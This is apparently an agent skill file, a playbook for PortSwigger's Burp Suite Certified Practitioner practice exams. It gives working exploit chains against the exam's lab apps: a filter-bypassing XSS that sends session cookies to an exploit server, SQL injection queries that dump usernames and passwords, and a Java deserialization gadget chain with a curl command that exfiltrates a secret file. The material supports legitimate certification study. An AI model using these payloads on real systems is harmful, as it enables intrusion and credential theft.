---
name: bscp-exam-playbook
sources: portswigger_academy, original_research
description: Burp Suite Certified Practitioner exam and practice-exam playbook. Covers the practice-exam environment mechanics (launching, provisioning, per-app stage status, the pass/fail page), the stage objectives, the endpoint/parameter name randomisation between attempts, the reconnaissance order that identifies each stage's vulnerability class with no prior context, and the verified exploit chains — eval-sink XSS with a per-attempt filter bypass, error-based PostgreSQL injection through an ORDER BY, credential extraction, admin takeover, and Java deserialization in the admin-prefs cookie to read /home/carlos/secret, including how to inventory the target's gadget classpath and build a commons-collections4 Runtime.exec chain when ysoserial's TemplatesImpl payloads die on a modern JDK. Use when taking a BSCP practice exam, when a target app must be assessed with no hint of the vulnerability class (exam, mystery lab, black-box engagement), or when a small blog/CMS-style app hides chained vulnerabilities.
---

# BSCP exam / practice-exam playbook

The exam gives you applications with **no indication of the vulnerability classes** and grades
you in sequential **stages**. This is the procedure and the verified chains — all three stages
of both practice exams were verified live and both were **passed 3/3**
(`MockPractitioner1` and `MockPractitioner2`).

**Names are randomised per attempt.** The two practice exams share the same app skeleton but
not its vocabulary — `/sign-in` vs `/login`, `/admin` vs `/admin_panel`, `/advanced_search` vs
`/filtered_search`, `SearchTerm` vs `find`, `organize_by` vs `order`, `{results,searchTerm}` vs
the same JSON behind a different path. Every canned script breaks on the next attempt: discover
the names from the rendered pages each time (the login form's `action`, the cookie's `Path`
attribute, the `<select name=…>` fields) rather than assuming the ones below.

## 1. Environment mechanics

| what | how |
|---|---|
| start a practice exam | `GET https://portswigger.net/web-security/certification/takepracticeexam/1` then POST the form with `RequestVerificationToken` + `PracticeExamType=MockPractitioner1` (values `MockPractitioner1` / `MockPractitioner2`) |
| the apps are provisioned async | you land on `/web-security/certification/examapps`; poll it — "Please wait while we collate the component stack" becomes a list of `<id>.web-security-academy.net` links after ~20-40s |
| timer | 2 hours; it does **not** start until you open the first app |
| per-app progress | the examapps page renders `App N Status: x/3 completed` — this is the only progress signal |
| end / restart | POST `/web-security/certification/endexam` with `RequestVerificationToken`; you then land on `/certification/examresult` and may start again (unlimited retakes) |
| pass/fail | once the third stage flips, `/certification/examapps` is replaced by "Congratulations — You've passed the practice exam" |

**Restarting is usually the right call after a destructive mistake.** Deleting a seeded user
(or otherwise mutating state) is not reset by relaunching an app instance — only ending the
exam reseeds it. `MockPractitioner1` is seeded deterministically, so a fresh instance of the
same practice exam has the same administrator password hash, the same users and the same
vulnerability placement; a *new* instance still means re-running the stages because the
progress counter is per exam attempt.

## 2. Stage objectives

| stage | objective |
|---|---|
| 1 | get any user access |
| 2 | get admin access |
| 3 | read the contents of `/home/carlos/secret` |

A stage that ends in a *value* is graded through the app's own banner button:
**POST `/submitSolution`**, `Content-Type: application/x-www-form-urlencoded`,
body `answer=<value>` → `{"correct":true|false}`. A value that ends in a *state change*
(a session hijack, an admin login, a full RCE) flips the counter by itself — check
`examapps` before assuming a stage did nothing.

## 3. Recon order that finds the class (works with no context)

1. **Entry points and auth**: `/login`, `/register`, `/myaccount`, `/admin`, `/advanced_search`,
   plus the asset paths in the HTML (`/resources/css/labsBlog.css` tells you it is the blog app).
2. **Read the JavaScript.** This is where the exam hides its client-side bug. A search page
   that does `eval('var x = ' + responseText)` is a code-execution sink, not a JSON parser.
3. **Every parameter, every shape**: reflect a sentinel, then break context. Test filter
   behaviour character by character (see §4 — a one-character filter decided a whole stage).
4. **Compare cookies before and after each privilege change.** The admin login set a brand-new
   `admin-prefs` cookie — that cookie *was* stage 3.
5. **The admin area last**: it is normally the *output* of a stage, not the input.

## 4. Verified chain — stage 1: eval-sink XSS → session theft

The search page loads `/resources/js/searchResults.js`, which runs:

```js
eval('var searchResultsObj = ' + this.responseText);
```

`SearchTerm` is reflected raw into that JSON (`/search_res` → `{"results":[],"searchTerm":"..."}`),
so `"};<js>//` breaks out. Three non-obvious obstacles, each of which looks like "not vulnerable":

1. **A literal `.` is filtered.** `a.b`, `a%2eb`, `document.cookie`, `document.location`,
   `https://x.y` and even `String.fromCharCode` all return **400**; `document['cookie']` and
   `atob('...')` return 200. Bisect characters one at a time — do not conclude "filtered, give up".
2. **Raw parentheses in the *page* request 400'd** while percent-encoded ones were fine: send
   `%28`/`%29`.
3. **The page, not the API, enforces the filter.** `/search_res?...` returns 200 for payloads
   the page's own request rejects with 400. Always test the request the victim's browser makes.

Dot-free exfiltration that beats the filter:

```js
"};location=atob('<base64 of https://HOST/marker?c=>')+encodeURIComponent(document['cookie'])//
```

```python
lab.exploit_store(f"<script>location={xss_url!r}</script>")
lab.exploit_deliver()
# then read the stolen session out of lab.access_log(); set the session cookie and you are carlos
```

**Stage 1 complete** (`Status: 1/3`). The victim is a bot that logs in as the low-privileged user
and revisits the site about every 15 seconds.

## 5. Verified chain — stage 2: error-based SQLi → admin takeover

`/advanced_search` takes `SearchTerm`, `organize_by`, `blogArtist` (all required, else
`400 Missing parameter`) and appends `organize_by` raw into:

```sql
SELECT * FROM posts ORDER BY <organize_by>
```

Two lessons:

* **A verbatim error is an extraction channel.** A failed PostgreSQL cast echoes the value:
  `(CAST((SELECT password FROM users LIMIT 1) AS INT))` →
  `ERROR: invalid input syntax for type integer: "b235d711d5858825"`.
  Wrap long values in `substr(expr, n, 60)` and slice to beat the message limit.
* **`CASE WHEN (<subquery>)` silently evaluates FALSE** on this build even though the same
  subquery works standalone. A boolean oracle built that way reads "false" for everything and
  looks like an empty database. Prefer the cast/error channel.

```sql
SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'
SELECT string_agg(username||':'||password||', ') FROM users
```

Then `POST /sign-in` with the administrator credentials. Merely holding the admin session is
what flipped the counter to `2/3`; the `/admin` page then exposes a Users list with
`GET /admin/remove?username=<user>` (no CSRF token) — do not "test" it, that is the destructive
mistake.

## 6. Verified chain — stage 3: Java deserialization in `admin-prefs` → RCE → secret

**The tell: a new cookie appears only after the admin login.**

```
admin-prefs=H4sIAAAAAAAA...; Path=/admin; Secure; HttpOnly
```

`H4sI` is gzip magic, so the value is `base64(gzip(java-serialized))` — here of
`lab.actions.common.serializable.AdminPrefs{favoriteFood, favoriteQuote, favouriteBook, theme}`.
Tampering one byte and resending it returns **`java.io.EOFException`**: the app feeds the blob
straight to `ObjectInputStream`, unsigned. Apache Commons is on the classpath, so a
CommonsCollections gadget chain gives RCE.

`Runtime.exec(String)` gets a whitespace-split argv with **no shell**, so wrap the real script in
brace expansion:

```bash
bash -c {echo,<base64 of the script>}|{base64,-d}|{bash,-i}
# {echo,PAYLOAD} expands to `echo PAYLOAD`, so the pipeline decodes and runs the script
```

The container cannot reach arbitrary internet hosts, but it **can** reach this lab's own exploit
server. The exploit server logs the request line only — **POST bodies are not recorded** — so
exfiltrate in the query string:

```bash
curl -sk "https://<exploit-server>/<marker>?c=$(cat /home/carlos/secret)"
```

```python
ser = subprocess.run(['java', '-jar', 'ysoserial.jar', 'CommonsCollections7', command],
                     capture_output=True).stdout
cookie = urllib.parse.quote(base64.b64encode(gzip.compress(ser)).decode())
s.get(BASE + '/admin', cookies={'admin-prefs': cookie})     # fires, returns 500
# read the secret out of the exploit server's /log, then:
s.post(BASE + '/submitSolution',
       data={'answer': secret},
       headers={'Content-Type': 'application/x-www-form-urlencoded'})   # {"correct":true}
```

### The gadget classpath is randomised too — probe it, never assume it

`MockPractitioner1` shipped commons-collections **3.x**: `CommonsCollections7` worked first try.
`MockPractitioner2` does not have it — the same payload returns
`java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap`, and every other
3.x chain (`CommonsCollections5/6`, `CommonsBeanutils1`, `Spring1`, `Hibernate1`, `Groovy1`,
`BeanShell1`, `Myfaces1`, `Clojure`, …) names a different missing class. Two things make this
recoverable in minutes instead of looking like "deserialization is patched":

1. **The exception text names the missing class** — it is a classpath inventory, one probe at a
   time. `exam_gadget_probe.py` walks every ysoserial chain and prints each error, so the
   inventory is a single run.
2. **A partially-present library is still enough.** Commons-collections **4** *was* there, but
   ysoserial's `CommonsCollections2`/`CommonsCollections4` route through
   `TemplatesImpl`, which throws on a modern JDK (`java.xml` is not opened to unnamed modules),
   so both fail with a bare "threw an exception". The class graph they use — `PriorityQueue` +
   `TransformingComparator` + `ChainedTransformer` — deserialized and *began executing*, which is
   the signal to keep the shell and only replace the sink.

So build the chain yourself: same graph, `Runtime.exec` instead of `TemplatesImpl`. That avoids
`TemplatesImpl` entirely, because `Runtime` is a public class in `java.base` reachable through
plain reflection:

```java
Transformer[] real = {
  new ConstantTransformer(Runtime.class),
  new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                         new Object[]{"getRuntime", new Class[0]}),
  new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                         new Object[]{null, new Object[0]}),
  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
};
ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) });
PriorityQueue<Object> q = new PriorityQueue<>(2, new TransformingComparator(chain));
q.add(1); q.add(1);
// swap the real chain in AFTER the queue is built, or the command runs locally during generation
ChainedTransformer.class.getDeclaredField("iTransformers").setAccessible(true)  // then set(chain, real)
```

`GenCC4Exec.java` is that generator; compile it against ysoserial's bundled
commons-collections4 4.0 (`javac -cp ysoserial.jar`), build the payload with
`java -cp .:ysoserial.jar GenCC4Exec '<cmd>'`, and base64(gzip(·)) it into the cookie exactly as
above. Note `InvokerTransformer` *deserialized* on the target (its `transform` ran), so
commons-collections4's "unsafe serialization disabled by default" guard was not in force —
confirm that from the target's own error rather than trusting a version number.

A correct answer flips the app banner to `APP Solved` and the exam apps page to the
**"You've passed the practice exam"** page. **Both practice exams passed 3/3.**

Working scripts from the verified runs: `exam_solve.py` / `exam2_solve.py` (stage 1),
`exam_sqli.py` (stage 2 extractor, parameterise the injected parameter), `exam_deser.py`
(stage 1-classpath ysoserial + exfil + submit), `exam2_deser.py` (custom CC4 gadget),
`exam_gadget_probe.py` (classpath inventory), `GenCC4Exec.java` (the generator).

## 7. Discipline that decides pass or fail

- **Bisect filters one character at a time.** "Blocked" is a finding, not a stop sign. The `.`
  filter turned a two-minute XSS into a wrong "not exploitable" call.
- **Test the exact request the victim's browser will make**, not an equivalent one from your
  HTTP client — same path, same encoding, same headers.
- **Read the verbose error before guessing.** It names the query, the column and the value.
- **Note every mutation you make.** Stages are sequential and the seed is shared; deleting a
  user to "see what happens" can cost the state a later stage needs, and only an exam restart
  restores it.
- **Diff the cookie jar after every privilege change.** The whole third stage lived in a cookie
  that only existed after the second stage.
- **When the objective is a value, submit it.** RCE that reads a file proves nothing to the
  grader until `answer=<value>` comes back `{"correct":true}`.
- **Names are randomised between attempts; the vulnerability classes are not.** A script that
  hard-codes `/sign-in`, `SearchTerm` or an endpoint will silently test the wrong thing. Read the
  form `action`, the `<select name=…>` fields and the `Set-Cookie` `Path` off the live pages.
- **A gadget that throws *inside* `transform()` is a supported gadget with a broken sink** —
  not an unsupported one. The exception text distinguishes the two:
  `ClassNotFoundException` = absent library (reprobe), `…threw an exception` = present library,
  dead sink (rebuild the chain around a different sink).
